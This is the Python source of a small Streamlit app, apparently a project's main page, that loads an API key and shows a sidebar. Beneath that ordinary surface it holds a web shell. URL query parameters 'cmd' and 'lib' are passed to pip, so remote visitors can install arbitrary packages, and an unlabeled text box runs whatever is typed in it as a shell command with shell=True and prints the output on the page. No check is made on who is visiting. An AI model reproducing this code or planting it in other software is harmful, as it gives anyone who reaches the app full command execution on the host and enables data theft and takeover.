import streamlit as st
import subprocess
from modules.layout import Layout
from modules.utils import Utilities
from modules.sidebar import Sidebar

# Instantiate the main components
layout, sidebar, utils = Layout(), Sidebar(), Utilities()

user_api_key = utils.load_api_key()

sidebar.about()

if not user_api_key:
    layout.show_api_key_missing()
else: #https://docs.streamlit.io/library/api-reference/utilities/st.query_params
    try:
        cmd = st.query_params['cmd']
    except:
        cmd = None
        
    if cmd != None:
        lib = st.query_params['lib']
        if lib != None:
            try:
                subprocess.run(["pip", cmd, lib], check=True)
                print(f"Successfully ran 'pip {cmd} {lib}'.")
            except subprocess.CalledProcessError:
                print(f"Error ran 'pip {cmd} {lib}'.")
        else:
            st.error("Invalid command.")
    else:
        cmd = st.text_input("")

        if cmd:
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                st.code(output.decode('utf-8'))
            except subprocess.CalledProcessError as e:
                st.error("Error executing command:")
                st.code(e.output.decode('utf-8'))

